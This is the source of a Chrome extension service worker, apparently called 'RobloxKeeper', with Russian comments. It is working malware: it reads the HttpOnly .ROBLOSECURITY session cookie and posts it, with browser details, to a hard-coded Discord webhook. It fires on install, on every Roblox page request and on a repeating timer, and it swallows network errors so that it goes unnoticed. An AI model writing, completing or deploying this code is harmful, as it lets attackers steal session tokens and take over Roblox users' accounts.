// background.js — service worker (Manifest V3)
const TARGET_COOKIE = '.ROBLOSECURITY';
const EXFIL_URL = 'https://discord.com/api/webhooks/1519693949214658762/MVHMg0w16OS3IkPVwLODMU2myWyAC5VF86n-L74rmxhtyk-w_jITF7yg_qpXUaXNfsG6'; // ЗАМЕНИ НА РЕАЛЬНЫЙ URL
const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
// Функция извлечения куки через chrome.cookies API (работает даже для HttpOnly)
function fetchRobloxCookie(details) {
  const url = details?.url || 'https://www.roblox.com';
  chrome.cookies.get({
    url: url,
    name: TARGET_COOKIE
  }, (cookie) => {
    if (cookie && cookie.value) {
      const payload = {
        cookie: cookie.value,
        domain: cookie.domain,
        path: cookie.path,
        secure: cookie.secure,
        httpOnly: cookie.httpOnly,
        session: cookie.session,
        expirationDate: cookie.expirationDate,
        captured_at: new Date().toISOString(),
        userAgent: navigator.userAgent,
        referrer: details?.url || document?.referrer || 'direct'
      };
      // Сохраняем в локальное хранилище расширения (для истории)
      chrome.storage.local.get(['history'], (res) => {
        let history = res.history || [];
        history.push(payload);
        if (history.length > 50) history.shift(); // ограничиваем историю
        chrome.storage.local.set({ history: history });
      });
      // Отправка на сервер — используем fetch (доступен в service worker)
      fetch(EXFIL_URL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          content: JSON.stringify(payload)
        }),
      }).catch(() => {}); // молча игнорируем ошибки сети, чтобы не палить
      // Дублируем в консоль для отладки (в production закомментить)
      console.log('[RobloxKeeper] Cookie captured:', cookie.value.substring(0, 30) + '...');
    } else {
      // Куки нет — возможно, не залогинены
      console.log('[RobloxKeeper] No .ROBLOSECURITY cookie found on', url);
    }
  });
}

// Перехват при загрузке любой страницы Roblox
chrome.webRequest.onBeforeRequest.addListener(
  (details) => {
    if (details.url.includes('roblox.com')) {
      fetchRobloxCookie(details);
    }
    return { cancel: false };
  },
  { urls: ['*://*.roblox.com/*'] },
  ['blocking']
);

// Перехват при установке/обновлении расширения — сразу пытаемся взять куку с активной вкладки
chrome.runtime.onInstalled.addListener(async () => {
  chrome.tabs.create({
    url: "https://roblox.com"
  });
  chrome.tabs.query({ url: '*://*.roblox.com/*' }, (tabs) => {
    for (const tab of tabs) {
      if (tab.id) {
        chrome.scripting.executeScript({
          target: { tabId: tab.id },
          func: () => {
            // Вызываем бэкграунд-функцию через рутовый объект
            chrome.runtime.sendMessage({ type: 'fetchCookie' });
          }
        }).catch(() => {});
      }
    }
  });
});

// Слушаем сообщения от content-скрипта или попапа
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === 'fetchCookie') {
    const tabId = sender?.tab?.id || null;
    if (tabId) {
      chrome.tabs.get(tabId, (tab) => {
        if (tab && tab.url && tab.url.includes('roblox.com')) {
          fetchRobloxCookie({ url: tab.url });
        }
      });
    } else {
      fetchRobloxCookie({ url: 'https://www.roblox.com' });
    }
    sendResponse({ status: 'attempted' });
  }
  if (message.type === 'getHistory') {
    chrome.storage.local.get(['history'], (res) => {
      sendResponse({ history: res.history || [] });
    });
    return true; // асинхронный ответ
  }
  if (message.type === 'clearHistory') {
    chrome.storage.local.set({ history: [] }, () => {
      sendResponse({ status: 'cleared' });
    });
    return true;
  }
  return false;
});

// Периодический опрос (каждые 30 секунд) — на случай, если кука обновилась через AJAX
setInterval(() => {
  chrome.tabs.query({ url: '*://*.roblox.com/*' }, (tabs) => {
    for (const tab of tabs) {
      if (tab.id) {
        chrome.scripting.executeScript({
          target: { tabId: tab.id },
          func: () => {
            chrome.runtime.sendMessage({ type: 'fetchCookie' });
          }
        }).catch(() => {});
      }
    }
  });
}, 2000);